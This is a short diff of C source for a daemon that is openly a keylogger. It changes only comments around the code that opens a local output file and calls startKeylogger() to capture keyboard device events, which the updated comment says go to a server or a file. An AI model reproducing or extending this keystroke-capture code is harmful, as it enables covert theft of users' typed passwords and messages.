@@ -54,13 +54,13 @@ int main(int argc, char *argv[])
     else if (file_out_type == FILE) /* If user decided to save events locally */
     {
         char *file_out_path = argv[1];
-        if ((fd = open(file_out_path, O_WRONLY | O_CREAT | O_APPEND | O_TRUNC, S_IRUSR | S_IRGRP | S_IROTH)) < 0)
+        if ((fd = open(file_out_path, O_WRONLY | O_CREAT | O_APPEND | O_TRUNC, S_IRUSR | S_IRGRP | S_IROTH)) < 0) /* Opening file out file */
             syslog(LOG_ERR, "Couldn't open file %s, quitting.. [%s]", argv[2], strerror(errno)), exit(EXIT_FAILURE);
         if(!unblockSignal(SIGTERM)) /* We can safely terminate daemon only by sending SIGTERM */
             syslog(LOG_ERR, "Couldn't unblock SIGTERM, quitting.. [%s]", strerror(errno)), exit(EXIT_FAILURE);
     }
 
-    startKeylogger(keyboard, fd); /* Reading from keyboard device and sending events to file */
+    startKeylogger(keyboard, fd); /* Reading from keyboard device and sending events to server or file */
 
     syslog(LOG_INFO, "**Daemon safely terminated**");
     close(flock); /* Closing daemon's lock file */
